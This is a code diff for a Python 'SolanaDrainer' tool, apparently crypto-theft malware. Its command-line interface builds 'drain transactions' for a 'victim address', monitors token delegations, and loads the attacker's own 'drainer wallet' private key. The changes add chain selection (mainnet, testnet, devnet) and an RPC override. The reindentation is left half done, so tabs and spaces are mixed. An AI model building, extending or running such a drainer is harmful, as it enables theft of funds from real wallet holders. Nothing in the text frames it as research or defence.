@@ -12,8 +12,8 @@ from typing import Optional, Dict, List, Tuple
 
 sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
 from backend.config import (
-	CHAIN_CONFIG, SOLANA_PRIVATE_KEY, SOLANA_WALLET_ADDRESS,
-	LOG_FILE
+    CHAIN_CONFIG, SOLANA_PRIVATE_KEY, SOLANA_WALLET_ADDRESS,
+    LOG_FILE, SOLANA_RPC
 )
 
 # Solana imports
@@ -40,30 +40,34 @@ except ImportError:
 
 
 class SolanaDrainer:
-	"""Handles Solana wallet operations: balance checking and draining."""
-    
-	def __init__(self):
-		self.config = CHAIN_CONFIG.get("solana")
-		if not self.config:
-			raise ValueError("Solana not configured in CHAIN_CONFIG")
-        
-		self.rpc_url = self.config["rpc"]
-		self.client = SolanaClient(self.rpc_url)
-        
-		# Our drainer wallet
-		if SOLANA_PRIVATE_KEY:
-			# Decode base58 private key
-			try:
-				decoded = base58.b58decode(SOLANA_PRIVATE_KEY)
-				self.drainer_keypair = Keypair.from_secret_key(decoded[:32])
-				self.drainer_address = str(self.drainer_keypair.public_key)
-			except Exception as e:
-				print(f"[-] Failed to load Solana keypair: {e}")
-				self.drainer_keypair = None
-				self.drainer_address = SOLANA_WALLET_ADDRESS
-		else:
-			self.drainer_keypair = None
-			self.drainer_address = SOLANA_WALLET_ADDRESS
+    """Handles Solana wallet operations: balance checking and draining."""
+
+    def __init__(self, chain_name="solana"):
+        self.chain_name = chain_name
+        self.config = CHAIN_CONFIG.get(chain_name)
+        if not self.config:
+            raise ValueError(f"Solana chain not configured: {chain_name}")
+
+        self.rpc_url = self.config["rpc"]
+        if SOLANA_RPC:
+            self.rpc_url = SOLANA_RPC
+
+        self.client = SolanaClient(self.rpc_url)
+
+        # Our drainer wallet
+        if SOLANA_PRIVATE_KEY:
+            # Decode base58 private key
+            try:
+                decoded = base58.b58decode(SOLANA_PRIVATE_KEY)
+                self.drainer_keypair = Keypair.from_secret_key(decoded[:32])
+                self.drainer_address = str(self.drainer_keypair.public_key)
+            except Exception as e:
+                print(f"[-] Failed to load Solana keypair: {e}")
+                self.drainer_keypair = None
+                self.drainer_address = SOLANA_WALLET_ADDRESS
+        else:
+            self.drainer_keypair = None
+            self.drainer_address = SOLANA_WALLET_ADDRESS
         
 		self.log_path = Path(LOG_FILE)
         
@@ -356,26 +360,28 @@ class SolanaDrainer:
 
 # ─── CLI Interface ─────────────────────────────────────────────
 def main():
-	import argparse
-	parser = argparse.ArgumentParser(description="Solana Drainer Tool")
-	parser.add_argument("--check", help="Check wallet balances")
-	parser.add_argument("--monitor", action="store_true", help="Start delegate monitor")
-	parser.add_argument("--build-tx", help="Build drain transaction for victim address")
-	args = parser.parse_args()
+    import argparse
+    parser = argparse.ArgumentParser(description="Solana Drainer Tool")
+    parser.add_argument("--chain", default="solana", help="Solana chain to use: solana, solana_testnet, solana_devnet")
+    parser.add_argument("--check", help="Check wallet balances")
+    parser.add_argument("--monitor", action="store_true", help="Start delegate monitor")
+    parser.add_argument("--build-tx", help="Build drain transaction for victim address")
+    args = parser.parse_args()
     
-	if not HAS_SOLANA:
-		print("[!] Install Solana dependencies:")
-		print("    pip install solana spl-token base58")
-		sys.exit(1)
+    if not HAS_SOLANA:
+        print("[!] Install Solana dependencies:")
+        print("    pip install solana spl-token base58")
+        sys.exit(1)
     
-	drainer = SolanaDrainer()
+    drainer = SolanaDrainer(chain_name=args.chain)
     
-	if not drainer.is_connected():
-		print(f"[-] Cannot connect to Solana RPC: {drainer.rpc_url}")
-		sys.exit(1)
+    if not drainer.is_connected():
+        print(f"[-] Cannot connect to Solana RPC: {drainer.rpc_url}")
+        sys.exit(1)
     
-	print(f"[+] Connected to Solana mainnet")
-	print(f"[+] Drainer wallet: {drainer.drainer_address}")
+    print(f"[+] Connected to Solana chain: {drainer.chain_name}")
+    print(f"[+] RPC: {drainer.rpc_url}")
+    print(f"[+] Drainer wallet: {drainer.drainer_address}")
     
 	if args.check:
 		info = drainer.check_wallet(args.check)
